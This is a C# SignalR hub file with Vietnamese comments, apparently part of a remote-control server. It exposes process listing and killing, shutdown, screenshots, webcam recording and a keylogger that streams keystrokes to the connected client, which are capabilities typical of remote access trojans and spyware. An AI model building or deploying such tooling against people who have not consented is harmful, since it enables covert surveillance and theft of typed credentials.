using Microsoft.AspNetCore.SignalR;
using Server.Services;
using Server.helper;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Threading;

namespace Server.Hubs
{
    public class ControlHub : Hub
    {
        private readonly SystemService _systemService;
        private readonly WebcamService _webcamService;
        private readonly InputService _inputService;
        
        private readonly IHubContext<ControlHub> _hubContext;

        public ControlHub(
            SystemService systemService, 
            WebcamService webcamService, 
            InputService inputService,
            IHubContext<ControlHub> hubContext)
        {
            _systemService = systemService;
            _webcamService = webcamService;
            _inputService = inputService;
            _hubContext = hubContext;
        }

        // --- NHÓM 1: HỆ THỐNG (LIST, START, KILL, SHUTDOWN) ---

        public async Task GetProcessList(bool isAppOnly)
        {
            var list = _systemService.ListProcessOrApp(isAppOnly);
            // Gửi kết quả về cho người gọi (Caller)
            string json = JsonHelper.ToJson(list); // Giả sử bạn đã có JsonHelper
            await Clients.Caller.SendAsync("ReceiveProcessList", json);
        }

        public async Task StartProcess(string path)
        {
            bool result = _systemService.startProcessOrApp(path);
            await Clients.Caller.SendAsync("ReceiveStatus", "START", result, result ? "Đã gửi lệnh mở" : "Lỗi mở file");
        }

        public async Task KillProcess(int id)
        {
            bool result = _systemService.killProcessOrApp(id);
            await Clients.Caller.SendAsync("ReceiveStatus", "KILL", result, result ? "Đã diệt thành công" : "Không thể diệt");
        }

        public async Task ShutdownServer(bool isRestart)
        {
            // Lệnh này một đi không trở lại, không cần await kết quả quá lâu
            bool result = _systemService.shutdownOrRestart(isRestart);
            await Clients.Caller.SendAsync("ReceiveStatus", "POWER", result, "Đang thực hiện lệnh nguồn...");
        }

        // --- NHÓM 2: MÀN HÌNH & WEBCAM ---

        public async Task GetScreenshot()
        {
            byte[] image = _webcamService.GetOneTimeSnapshot();
            // Gửi ảnh về Client
            await Clients.Caller.SendAsync("ReceiveImage", "SCREENSHOT", image);
        }

        // Lệnh: Mở Webcam -> Quay 3s -> Gửi về -> Giữ cam mở
        public async Task RequestWebcamProof()
        {
            // Gửi thông báo đang xử lý
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đang quay video bằng chứng...");

            var cancelToken = new CancellationTokenSource(5000).Token; // Timeout an toàn 5s
            var frames = await _webcamService.RequestWebcamProof(10, cancelToken); // 10 FPS

            // Gửi từng frame hoặc gửi cả list (ở đây gửi từng frame cho mượt)
            foreach (var frame in frames)
            {
                await Clients.Caller.SendAsync("ReceiveImage", "WEBCAM_FRAME", frame);
                await Task.Delay(100); // Giả lập phát lại
            }
            
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã gửi xong bằng chứng.");
        }

        public async Task CloseWebcam()
        {
            _webcamService.closeWebcam();
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã đóng Webcam.");
        }

        // --- NHÓM 3: KEYLOGGER (INPUT) ---

        public async Task StartKeyLogger()
        {
            string connectionId = Context.ConnectionId;
            
            // Bắt đầu lắng nghe và gửi từng phím về Client
            _inputService.StartKeyLogger(async (keyData) => 
            {
                // Lưu ý: Dùng _hubContext để gửi từ luồng background
                await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
            });

            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Keylogger đã bắt đầu.");
        }

        public async Task StopKeyLogger()
        {
            _inputService.StopKeyLogger();
            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", false, "Keylogger đã dừng.");
        }
    }
}